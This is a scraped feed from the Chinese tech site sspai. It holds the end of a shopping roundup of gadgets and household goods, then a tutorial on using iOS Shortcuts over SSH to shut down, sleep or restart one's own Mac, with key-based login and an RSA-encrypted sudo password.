src=\"https://cdn.sspai.com/2021/08/10/9ca817ed55ae4f68118369233932518a.png\"></figure><h3>iQunix M80 键盘</h3>\n<p>￥459 <s>原价￥499</s></p>\n<p>🛒<a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=645015794911\" target=\"_blank\">点这买 &gt;</a></p>\n<p>谁说「铝厂」出品就只能外观方正冷冰冰？这款 iQunix M80 一改之前的风格，走起了可爱的猫咪路线，黄 / 蓝 / 粉三色可选，除了猫耳造型的键帽，甚至还有硅胶材质的捏捏乐。80 布局的温馨白光，连接方式为 Type C + 蓝牙 5.0 的双模，对于 Mac 用户同样适用，可以通过快捷键切换到 Mac 布局。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/18/6d80aa698d671bff676a9b11f4eb3cf7.jpeg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><h2>🥰 送己好好生活</h2>\n<h3>Chakolab 不锈钢吸管保冷杯</h3>\n<p>¥99 <s>原价 ¥158</s></p>\n<p>🛒<a href=\"https://shop11352888.m.youzan.com/wscgoods/detail/26xspu7myiyj4\" target=\"_blank\">点这买 &gt;</a></p>\n<p>@Welber：我承认，最开始我是被这款杯子的颜值所吸引，所以压根没有在意它的产品介绍。收到产品、打开包装，实物简直是太好看了！水杯一共有四款颜色，我选择的是「阳光芥末」配色，非常的清新，很适合夏天。杯身是磨砂涂层，杯体是不锈钢材质，底部还有防滑设计，整体上做工还不错。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/08/article/e7bbb49281786e3ab0e798be12603510\"></figure><p>新杯子到手以后第一件事，肯定是清洗。这款水杯的每一部分都是可以拆开独立进行清洗，非常方便。夏天天气炎热，装盛一些咖啡、牛奶之类的饮品，如果不及时清洗肯定容易产生异味，所以可拆洗的设计还是非常必要的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/08/article/fb25f8452d3b676e74e82a3a05cc510f\"></figure><p>吸管水杯通常都不可以装热水，因为热水会让杯子内部的气压过高从而导致热水喷溅。但我在装冷水后也发现，水杯并不能完全做到百分百的滴水不漏。至少可以保证的是，如果你是一个喜欢把水杯放在电脑旁边的人，用这款水杯喝水可以大大降低把水杯打翻在电脑上的概率。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/08/article/95dd110c65561e937a0343c245d454e7\"></figure><p>这款水杯不光是一个吸管水杯，还是一个保冷杯，这对于炎炎夏日来说是一个非常大的亮点。我也大致测试了一下保冷效果：我从超市里买来的冰可乐，放在室内大约4小时，拿起来喝的时候还是很冰。拿到室外也许保冷效果会差一些，不过我实在不想去室外测试啦😅</p>\n<p>总体来说，这款水杯很适合日常放在办公桌上喝水，偶尔拿来放一些冰镇的饮料。不过就冲着这个颜值，我就已经忍不住要下单了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/08/240f81fd69bab57c942a5e186da044ef.jpg\"></figure><h3>猜不到设计喵爪风铃</h3>\n<ul>\n<li>Mini 款￥188 <s>原价￥208</s>\n</li>\n<li>长款￥198 <s>原价￥218</s>\n</li>\n</ul>\n<p>🛒<a href=\"https://shop11352888.m.youzan.com/wscgoods/detail/365af0fei2ge8\" target=\"_blank\">点这买 &gt;</a></p>\n<p>@ThomasTeng：小时候关上房门偷偷玩游戏时，总希望能有人帮忙在门口把风，遇到风吹草动立即响应，但现实是残酷的，如今的我们很难再找到一位可靠的「看门人」。人没找到，但我找到了一只猫，确切地说是一只可爱的猫爪铃铛，来自「猜不到设计」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/08/article/b9a66b1f8b69b93847d8ed1008538efe\"></figure><p>给我的第一印象就是「精致」「可爱」，包装上一幅网红招财猫标签彰显了它的饰品属性，打开包装，铃铛周围使用黑色缓冲棉包裹，底部附有三片 3M 背胶，可以将它固定在木门或墙面上。底部的金属螺柱实际包含了磁铁，可以很牢固地吸附在冰箱或防盗门上。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/08/article/e29fc707062123962abe59a507ce8781\"></figure><p>作为「前」实木家具定制者，我第一时间就被它的做工所吸引，先来看一下这款铃铛的结构设计。</p>\n<p>看似简洁的实木造型，在「猫爪」处使用了雕刻镶嵌工艺，深色猫爪与原木色撞色搭配，确保了结合处的过渡整洁。</p>\n<p>作为一个强调「手作」的品牌，猜不到设计并没有盲目追求全手工制作，根据我的粗浅观察，这款铃铛多处运用了「标准化」的加工方式，在降低成本的同时提供给我们更加一致的体验。比如，使用 CNC 雕刻带来大小形状一致的装配孔及「猫爪」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/08/article/4608f8c7f9a65608400f49f1689c537e\"></figure><p>再来看一下它的材质搭配，主材使用了沙比利木，铃铛使用了黄铜材质，非常经典的搭配方式，既复古又突出了物品的质感。底部使用尼龙螺钉固定铃铛本体，耐腐蚀且能和实木贴合紧密，用于悬挂铜球的位置使用了金属加固，避免木质孔的磨损，后部安装的金属连接件同时起到了磁铁的作用。最后，再看一下它的表面处理，使用了我最爱的的木蜡油涂装，这样能够充分发挥实木材质纹理带来的上佳手感。</p>\n<p>那么，这么可爱的猫爪铃铛用在哪里比较好呢？我认为有这么两大「功效」：</p>\n<ul>\n<li>开门检测（门铃）：把它贴在房门上，有人推门进来时可为我们提供约 1s 的时间用于「调整状态」，以最友好的面貌迎接来客。</li>\n<li>偷吃检测（冰箱门）：当夜深人静之时，为了获取创作灵感，我轻手轻脚来到厨房，打开冰箱门拿出冷藏已久的快乐水…… 等等，好像哪里不对？</li>\n</ul>\n<p>总之，这么一只可爱的猫爪铃铛，能够适时或不合时宜地发出据说经过专业调音的清脆响声，能为我们增添不少生活中的快乐，确信。</p> <h3>小仓熊 小白鞋清洁剂</h3>\n<p>￥24.9 <s>原价￥39</s></p>\n<p>🛒<a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=652981295164\" target=\"_blank\">点这买 &gt;</a></p>\n<p>@SamWanng：正所谓买鞋穿鞋特别爽，擦鞋洗鞋只想躺——鞋子的日常清洁着实令人头痛。过去几年，我先后尝试过鞋子的清洁服务，也购买过不少清洁产品。</p>\n<p>清洁服务价格高，也很难找到称心的。清洁产品市面上倒是有不少——清洁泡沫、清洁啫喱，这类产品做得都比较成熟了，清洁效果也还都不错。但是这类产品大多数使用起来都比较繁琐，比如用水稀释啫喱液，气泡后再涂抹在鞋子上用刷子清理。</p>\n<p>前两天收到这套小仓熊的清洁套装就比较简洁方便——它的清洁工具和清洁剂是一体的——清洁剂从刷头处挤出，然后很自然地使用刷头在污渍处擦洗起泡，清洁完毕后用干抹布擦去污渍即可。因为刷头是纳米海绵和刷子的组合，可以清洁大部分材质的鞋面——编织（帆布鞋）、皮面（皮鞋、板鞋）、飞线（Yeezy、跑鞋）等均不在话下。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/f4f90d8cae9f7c510b8164e406fac6ff\"></figure><p>这个套装除了清洁剂还提供了一瓶增白剂，这就非常方便喜欢穿帆布鞋和小白鞋的朋友。帆布鞋白色的鞋头以及小白鞋在穿着已久的情况下，会出现氧化、色素沉淀的问题——没之前那么白了，那么使用增白剂就可以让它容光焕发，昨日重现。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/4c47df2068f7c3cbd34a3b6b08610a8b.jpg\"><figcaption>左：清洁后使用增白剂 右：仅清洁 @问路的帆布鞋</figcaption></figure><p>总之在这个价位里，这套鞋子清洁剂确实是好用、好看又具性价比。如果你有需求，不妨买一套试试。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/02e373ec818676c1f2889abf3af098f3.gif\"><figcaption>办公室同事疯狂擦鞋</figcaption></figure><h3>Bgest 自动真空保鲜罐</h3>\n<p>￥199 起 <s>原价￥239 起</s></p>\n<p>🛒<a href=\"https://shop11352888.m.youzan.com/wscgoods/detail/1y8w2b7e9ywao\" target=\"_blank\">点这买 &gt;</a></p>\n<p>食品保鲜永远是厨房的主要需求之一，而来自 Bgest 这款自动抽真空罐可以减缓氧气与食物的接触，延长保鲜 3-5 倍。它不借助外部设备，只需要按下盖子上的开关，就可以一键真空，采用磁吸充电方式，以一天开盖一次计算，充电一次可以使用半年，各类的柴米油盐都可以分类摆放，整齐又美观。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/08/852e73aff046aba0cf59fd3fe50ef6de.jpg\"></figure><h3>UKA 玻璃保温 / 保冷马克杯</h3>\n<p>￥75 <s>原价￥89</s></p>\n<p>🛒<a href=\"https://shop11352888.m.youzan.com/wscgoods/detail/3f09oejew1xqo\" target=\"_blank\">点这买 &gt;</a></p>\n<p>@煎饼：为了防止咖啡变冷，我付出过很多努力，比如购买电加热杯垫、毛线杯套等等，但都因为麻烦放弃了。同时，大部分保温杯都是随身杯的样式，不锈钢内胆、无法直接在微波炉里加热、口径很小且深不易清洗……</p>\n<p>最近在我派商店发现的 UKA 保温马克杯，刚好解决之前的问题，保温保冷这些基础功能就不说了，最方便的是可以直接放在微波炉里加热，能少洗一个锅子或水壶非常提高懒人的幸福感。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/08/d45b7ccd33787c8d0fbd5be176859cee.jpg\"></figure><p>采用高硼硅玻璃内胆，在酸碱高温环境下非常稳定，不会向杯容物中释放有害物质，倒入热水也不会烫裂，玻璃材质和大口径设计更容易清洁。</p>\n<p>除此之外，采用双层杯体结构不怕摔，不用经历喜欢的玻璃杯摔碎的痛苦，底部还有硅胶防滑圈，虽然是个带盖保温杯，但依然很轻巧。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/08/23d1908e999c8207ada1d3795805987a.jpg\"></figure><p>当然，现在正是 30 几度的夏天，能为冰饮料保冷才是最重要的啊。</p>\n<h3>UKA 冷鲜便当盒</h3>\n<p>￥99 <s>原价￥119</s></p>\n<p>🛒<a href=\"https://shop11352888.m.youzan.com/wscgoods/detail/2xf592otfswzk\" target=\"_blank\">点这买 &gt;</a></p>\n<p>@阿娇：见到 UKA 的第一眼吸引我的一定是它的颜值，表面是磨砂材质，散发着一种高级感，我选择了清新又舒服的浅绿色。夏天带饭最担心的是饭菜变质，正常情况都是带午饭，早上做好到中午吃饭时间至少间隔 3-4 个小时，如果没有良好的冷藏环境食物很容易在高温环境下馊掉，UKA 最大的功能点是中间的保冷模块，既有分类功能还能让食物保持最佳状态。盒体可放入微波炉，自带硅胶密封圈，盒体外有固定带，可有效避免流出汤水。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/fac64f8d4da62a01f6f3ad52e22d0f6c.jpg\"></figure><p>最让我喜欢的是蘸料盒的存在既可以装东西还能起到隔层的作用。除带饭外跟小伙伴出去野餐装水果食物也是优选。（偷偷讲一句，本产品最适合健身减肥的小伙伴）</p>\n<h3>Eraclean 隐形眼镜 / 美瞳清洗盒</h3>\n<p>￥159 <s>原价￥199</s></p>\n<p>🛒<a href=\"https://item.taobao.com/item.htm?id=645389759512\" target=\"_blank\">点这买 &gt;</a></p>\n<p>对于佩戴隐形眼镜的人士，日常的携带和清理确实是一个问题，而来自 EraClean 的这款隐形眼镜清洗盒，配合护理液使用，通过高频超声波震荡的方式进行清洁冲刷，不光可以用作清洗使用，还能充当存储盒。机身采用了小巧椭圆形的外观设计，IPX7 级别的防水，采用了磁吸的充电设计，只需要两分钟，就可以让蛋白质、脂质、灰尘等剥离，实现护理便携的二合一。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/18/14f9674defffe77513d832acbc59207b.jpeg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><h2>这些老朋友也在打折……</h2>\n<p>🏖️ <a href=\"https://sspai.taobao.com/search.htm?orderType=&amp;viewType=grid&amp;catId=1608317477&amp;keyword=%CF%C4%C8%D5%CF%DE%B6%A8&amp;lowPrice=&amp;highPrice=\" target=\"_blank\">点这买夏日限定渔夫帽 / T 恤&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/08/article/e7ffaf566aa5532162b1e346816410bf\"></figure><p>👩‍💻 <a href=\"https://item.taobao.com/item.htm?id=625968670784\" target=\"_blank\">点这买 Mac 背后的你钥匙链&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/08/article/897537668fe0a0454cf55d2acc30bfbc\"></figure><p>🧴 <a href=\"https://sspai.taobao.com/search.htm?orderType=&amp;viewType=grid&amp;keyword=%D6%BB%C7%E1&amp;lowPrice=&amp;highPrice=\" target=\"_blank\">点这买只轻 男士护肤系列&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/08/article/a5830bcdc52d7c25032de4c471b6d611\"></figure><p>⌨️ <a href=\"https://sspai.taobao.com/search.htm?orderType=&amp;viewType=grid&amp;keyword=Keychron&amp;lowPrice=&amp;highPrice=\" target=\"_blank\">点这买 Keychron K1 / K2 机械键盘&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/08/article/d1f04ebb1605f0f9735c0f328c3e3b0e\"></figure><p>⌨️ <a href=\"https://item.taobao.com/item.htm?id=634310719101\" target=\"_blank\">点这买鲨鱼君茶包套装&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/08/article/c6415fd6102b68513930e4a493e9b250\"></figure><p>🔋 <a href=\"https://item.taobao.com/item.htm?id=624918843222\" target=\"_blank\">点这买 Zendure SuperMini 移动电源&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/c91e915604a1bc05d1292b27d864c6fa.png\"></figure><p>⚡ <a href=\"https://item.taobao.com/item.htm?id=651246267943\" target=\"_blank\">点这买电派 G4 无线充电底座&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/3017b99d227db502510365ad3516903e.png\"></figure><p>🔩 <a href=\"https://shop11352888.m.youzan.com/wscgoods/detail/3nmr0pqz7huy8?step=1\" target=\"_blank\">点这买 Wowstick 手动 / 电动 螺丝刀套装&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/08/article/6dd57adc33e39fb704e50b184a059e31\"></figure><p>🔪 <a href=\"https://shop11352888.m.youzan.com/wscshop/showcase/feature?alias=oKMVAS664X&amp;kdt_id=11160720\" target=\"_blank\">点这买 Slice 开箱刀&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/08/article/1df79a291993820851e08885fe5df017\"></figure><p>🚀 <a href=\"https://shop11352888.m.youzan.com/wscgoods/detail/2fwh01k2qi7nk\" target=\"_blank\">点这买黄油猫太空舱充电宝&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/a0b8708a768cce0cde43bc9df1253da5.png\"></figure><p>🎼 <a href=\"https://shop11352888.m.youzan.com/wscgoods/detail/2g2oslenjwgcg\" target=\"_blank\">点这买 DONHA 口琴项链&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/08/article/dc48448371422a0708d96899a7e5b803\"></figure><p>💄 <a href=\"https://shop11352888.m.youzan.com/wscgoods/detail/3nsuo52py7kf4\" target=\"_blank\">点这买 Lofree 尾巴化妆刷套装&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/08/article/f90c153efbb08c9871853685fe3643d2\"></figure><p>🦷 <a href=\"https://shop11352888.m.youzan.com/wscgoods/detail/26xro93cnj5io\" target=\"_blank\">点这买素士冲牙器&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/08/article/ed86cd9ae978b95b8375d8d40dc40ed3\"></figure><p>&gt; 关注少数派 <a href=\"https://shop549593764.taobao.com/index.htm?spm=2013.1.w5002-18497266160.2.2fa346beBU2yc8\" target=\"_blank\">官方周边淘宝店</a> / <a href=\"https://weibo.com/u/6293993963\" target=\"_blank\">@吃派的水獭</a>，了解更多新奇有趣的科技产品 🏬</p>\n<p>&gt; 提升工作效率，掌握生活技巧，来少数派 <a href=\"https://shop184770392.taobao.com/index.htm?spm=a1z10.1-c.w5002-23492264167.2.528c2ac4r8butZ\" target=\"_blank\">正版软件淘宝店</a> 看看 💾</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68166"},{"title":"巧用快捷指令开关机，让 iPhone 成为 Mac 的遥控板","date":"2021-08-09 06:30:03","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<h3>前言</h3>\n<p>在生活中的一些场景，可能需要使用 iPhone 控制 Mac 的电源。例如在上床后，需要关闭电脑电源，或者是使电脑熄灭屏幕。其实，在少数派上早有文章可以实现这些功能，但是配置较为复杂。例如下面的这两篇文章。</p>\n<ul>\n<li><a href=\"https://sspai.com/post/35242\" target=\"_blank\">《把你的 iOS 设备变成控制 Mac 的「遥控器」》</a></li>\n<li><a href=\"https://sspai.com/post/35799\" target=\"_blank\">《无需第三方 App，同样可以把你的 iOS 设备变成 Mac「遥控器」》</a></li>\n</ul>\n<p>但是本文仅使用捷径，就可以很简单地实现这些功能。接下来就随着文章，来看看如何使用捷径，控制电脑执行重启、注销和关机等操作。读完本文后，可以学到以下知识点：</p>\n<ol>\n<li>如何开启远程登录 Mac</li>\n<li>捷径 SSH 模块的使用</li>\n<li>SSH 公钥的使用方法</li>\n<li>RSA 加密的实际运用</li>\n</ol>\n<h3>Mac 配置</h3>\n<p>为了实现局域网内的控制，首先需要开启 macOS 的 ssh 访问功能。前往「系统偏好设置」&gt;「共享」，勾选「远程登录」，打开 ssh 远程登录功能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/58210f4994575209002d8d63a342761b\"></figure><p>点击上方的「编辑...」，编辑局域网内电脑的名称，例如此处的 james，最后点击「好」保存设置。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/d05f67f35c2db93901860c4110b0e79b\"></figure><p>此时，如果要在局域网内访问电脑，只需要访问 james.local 即可。这样做的好处是，即使电脑切换到其他网络下，Mac 在局域网内 IP 地址发生改变，也依旧可以通过主机名访问。</p>\n<p>最后，可以通过 ssh 命令确认开启状态。打开终端，输入「ssh 主机名」连接本机，例如图中的「ssh james.local」，如果正常就会询问密钥指纹是否正确。反之，如果 ssh 服务没有正常工作，就会像第二条命令一样显示「Connection refused」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/f6582c07bd53574c028feb2d5941e11e\"></figure><h3>捷径构建</h3>\n<p>接下来，就要使用构建捷径来实现功能。新建捷径，搜索 ssh 模块，选择「通过 SSH 运行脚本」添加模块，可以看到该模块要求输入以下参数：主机、用户、认证方式、密码和命令。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/1e8dd1bfd2672a2e2c1bd4b50a8e241d\"></figure><p>在上一步，已经设置好的主机名即为主机参数。用户和密码对应着电脑的用户密码，不必多说。最重要的是该执行什么命令。所以特在此整理了一份命令速查表，读者可以根据需要复制相应的命令。</p>\n<figure class=\"table\"><table><tbody>\n<tr>\n<td>关机</td>\n<td>shutdown -h now</td>\n</tr>\n<tr>\n<td>重启</td>\n<td>shutdown -r now</td>\n</tr>\n<tr>\n<td>常亮</td>\n<td>pmset noidle</td>\n</tr>\n<tr>\n<td>电脑休眠</td>\n<td>pmset sleepnow</td>\n</tr>\n<tr>\n<td>屏幕休眠</td>\n<td>pmset displaysleepnow</td>\n</tr>\n<tr>\n<td>唤醒电脑</td>\n<td>wakeonlan 网卡地址</td>\n</tr>\n</tbody></table></figure><p>这个表格有两个地方需要补充说明，首先是「唤醒电脑」功能。该功能需要在局域网内有一台其他设备，例如树莓派。捷径实际上是发送 wakeonlan 给树莓派。树莓派再通过 WOL 协议唤醒 Mac，而不是直接将命令发给 Mac，这一点请切记。</p>\n<p>其次，还要注意的是 shutdown 命令属于系统级命令，需要超级用户权限才能执行。如果在终端里直接执行该命令，会有如下的报错，而且也无法关闭电脑。因为目前登录的是用户，而不是超级用户。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/32d5c1564272ab8969f02eb071da532e\"></figure><p>为了能够正常执行该命令，需要在前面加上 sudo，以此表示使用超级用户权限执行命令。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/bc117326d5e5d47f54966eeec45303bc\"></figure><p>在命令前面添加 sudo 之后，会要求输入用户的密码进行确认，密码输入正确之后即可关机。但是这时候要注意到一个问题，捷径是没有办法与电脑交互的，更别提输入密码了。sudo 命令的作者 Robert Coggeshall 显然也考虑到了这个问题，所以提供了一个 -S 的参数，该参数可以接收管道传来的字符串，作为密码进行确认，无需手动输入密码。</p>\n<p>所以加上 -S 参数后的关机命令是如下，此处的「密码」需要更换成读者的电脑密码。</p>\n<pre class=\"language-\"><code>echo 密码|sudo -S shutdown -h now\n</code></pre>\n<p>命令构建完成之后，就可以开始填写捷径参数了。如下图所示，可以看出用户名是 james，密码是 123456（当然是假的了）。保存该捷径，命名为关机，通过喊一句「heySiri, 关机」即可关闭电脑电源。当然，这里的关机只是一个演示功能，对于 macOS 用户来说，更常见的电源操作应该是：pmset sleepnow（电脑休眠）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/742811a42daf5923f5229a394a8adb60\"></figure><p>但是细心的读者可能也注意到了，此处的密码是明文保存，非常不安全。此处需要特别说明的是，密码区域的 123456 之所以是明文，这是因为作者使用的是 iOS 15 测试版，在 iOS 14 上它应该是 6 个小黑点。但是即使是这样，命令区域输入的密码依旧是不安全的明文，安全性有待提高。所以在实现基本功能之后，就可以来完善它的安全性了。</p>\n<h3>更换密钥验证</h3>\n<p>在上一步，作者使用密码作为验证访问 Mac。但是这样做，轻则暴露密码长度，重则直接暴露密码，所以可以考虑使用密钥验证。点击「认证」选择「SSH 密钥」，捷径就会生成 SSH 密钥以供使用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/15654f8895fb0d7b5b13876dbe9bcef1\"></figure><p>从上图右边可以看出，这个密钥的类型是 ed25519。如果想要其他类型的密钥，可以点击下面的「生成新密钥」进行选择，作者在此处选择了 2048 位的 RSA 密钥。读者可以根据自己的偏好选择，无论是 ed25519 还是 RSA 方法都是一样的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/3e5d94fb75243feecbae974d23898f3a\"></figure><p>生成 SSH 密钥后，就要在电脑上配置密钥。点击「共享公共密钥」，将密钥文本导出，将密钥发送到电脑上。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/391629da7e0a357ee60ac7316ea139a5\"></figure><p>通过 Finder 的快捷键 shift+command+G，前往 ~/.ssh 文件夹。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/8f73b260f2f7058dcef5b7b42e241cdd\"></figure><p>新建名为 authorized_keys 的文件，粘贴密钥，将文件保存到 ~/.ssh 路径之下。这样配置之后，就可以无需密码，直接通过公钥访问 Mac。此处的图形界面操作是为新手考虑而写，有 命令行基础的用户，请直接使用下面这条命令追加公钥。 </p>\n<p> </p>\n<pre class=\"language-null\"><code>pbpaste &gt;&gt; ~/.ssh/authorized_keys</code></pre>\n<p> </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/ddc1020d38d2db905320fa4c3a391bce\"></figure><h3>密码加密传输</h3>\n<p>在解决完了密钥验证问题之后，还剩下命令里的明文密码要解决。这时候可以请出大名鼎鼎的 RSA 非对称加密算法了。非对称加密需要公钥，私钥一对。顾名思义，公钥是可以公开传播的，而私钥就是要私藏好的。公钥可以用于加密，却无法解密，只有使用私钥才可以解密。所以只要妥善保管私钥，那么整个加密体系就是安全的。</p>\n<p>接下来，就来看看 RSA 加密的实际应用。首先需要生成一对公私钥，它将被用以加解密文本，命令如下：</p>\n<pre class=\"language-\"><code># 生成私钥\nopenssl genrsa -out ~/.ssh/PrivateKey.pem 2048\n\n# 生成公钥\nopenssl rsa -in ~/.ssh/PrivateKey.pem -pubout &gt; ~/.ssh/PublicKey.pub</code></pre>\n<p> </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/eb196e086c705d6cc9feb971d4940458.png\"></figure><p>将密码进行加密并编码，echo 后面跟随的内容即为密码，例如此处的 123456，请将此处的 123456 替换为读者自己的电脑密码。</p>\n<pre class=\"language-\"><code>➜ echo 123456|openssl rsautl -encrypt -pubin -inkey ~/.ssh/PublicKey.pub\ny��ڊ��_���Ɲ�Ea�� P�h�6��&gt;\"C�傣�E�!�+���\n                                       ��[�B�����7��'3�P�        u#D*�\n&amp;���A߶�7ږ���Y߇{�^}�I�8*��ft�뱱ރ�z��+��v=ജK�2������i� ���VFש�</code></pre>\n<p> </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/8a0d83f83a3039878cba4686c2a28618\"></figure><p>但是可以看出，经过加密之后的 123456 变成了一串乱码，这是因为 RSA 加密的结果是二进制流，而非普通的可打印字符，那么这还怎么使用？这时候，就可以请出 base64 编码了，它可以将任何信息流都转换为特定字符集内的编码。</p>\n<pre class=\"language-\"><code>➜ echo 123456|openssl rsautl -encrypt -pubin -inkey ~/.ssh/PublicKey.pub|base64\nO7O6emCBxJ6jG0elhtnFjHwTkRl8mofO+UkfRFzcL5casGTwYAIM2sC1grXlMkyL21lT6OkAtOEC\nl9hHHbshfgZHrMRFlCvOp0C3NdiQga50Jau14Hx6oNcahxtXLoS8x1dH5sPpypLVOBFk1OaJ9daF\nHWGX/eI7S6GBCOguOd0fuzimI66dUXcQFmOvH8Ou2veoF3LrjSffE2lLCQCt7k3/YCznonsUu6lv\nDS+E9G4cSSrXQrcf/HsITsWLa3TpwF/iLL3Uh1NaOY9M998vhB/u/DTwi8OJf7ygXVu9YdIthe4n\n0t/ACABYRf9yOGG1vnT8LXqvPFFHVynGAbwP2Q==</code></pre>\n<p> </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/87fcd81edf236ab9e1a2bdfda3847605\"></figure><p>此处的 O7O...Q== 即为密码加密编码之后的结果。如果需要验证是否正确，可以进行解密验证。可以看出，成功解密出了 123456 的密码明文。</p>\n<pre class=\"language-\"><code>➜ echo 'O7O6emCBxJ6jG0elhtnFjHwTkRl8mofO+UkfRFzcL5casGTwYAIM2sC1grXlMkyL21lT6OkAtOEC\nl9hHHbshfgZHrMRFlCvOp0C3NdiQga50Jau14Hx6oNcahxtXLoS8x1dH5sPpypLVOBFk1OaJ9daF\nHWGX/eI7S6GBCOguOd0fuzimI66dUXcQFmOvH8Ou2veoF3LrjSffE2lLCQCt7k3/YCznonsUu6lv\nDS+E9G4cSSrXQrcf/HsITsWLa3TpwF/iLL3Uh1NaOY9M998vhB/u/DTwi8OJf7ygXVu9YdIthe4n\n0t/ACABYRf9yOGG1vnT8LXqvPFFHVynGAbwP2Q=='|base64 -d|openssl rsautl -decrypt -inkey ~/.ssh/PrivateKey.pem\n123456\n</code></pre>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/f9c6dce114d35ec8c766ecbd1e93109f\"></figure><p>接下来，只需要把原来命令里的 echo 123456 替换成加密后的 base64，即可实现密码的加密。替换之后的命令如下所示。</p>\n<pre class=\"language-\"><code>echo 'THdWo9IwCBLk65DPWZ8ZnC8+8eoogVcWAlUcViSM3DwKftC2L5KhZ5yBkN5EKIhNt0ogEsZxD+zF\ntSiiHNQfA0FjLME/HxOtvLlObmjH6Xkhztkc+Q2Fm+f3FbhIP5YiK2hnWGD+8kNDIYrqhVy0NeRH\n8L8ga36YwQbj/jVoy6H66qPbKy+/9DyGNVKUbrKpEoNrj5MULUL8h+e3bY7NM5JhYNvN3OVkmUn4\nIfRsn8mXQjgfftksL0fmNq52O/4bsTjDFaxuVfC9np7u4F9ujWMYnefiUDxdwGTb0yCR6+8uoJsb\nHVSNwSNUB80OcdJv5AITYCpX9Eifz9GHb/kiXA=='|base64 -d|openssl rsautl -decrypt -inkey ~/.ssh/PrivateKey.pem |sudo -S shutdown -r now</code></pre>\n<p>该命令由 4 个小命令组成，由 |（管道符）进行连接。首先使用 echo 输出 base64 编码，通过 base64 -d 解码出二进制流，传递给 openssl 命令解密出明文。最后将明文作为参数，传递给 sudo 命令作为密码使用，执行立即关机的命令。</p>\n<h3>效果演示</h3> <p> 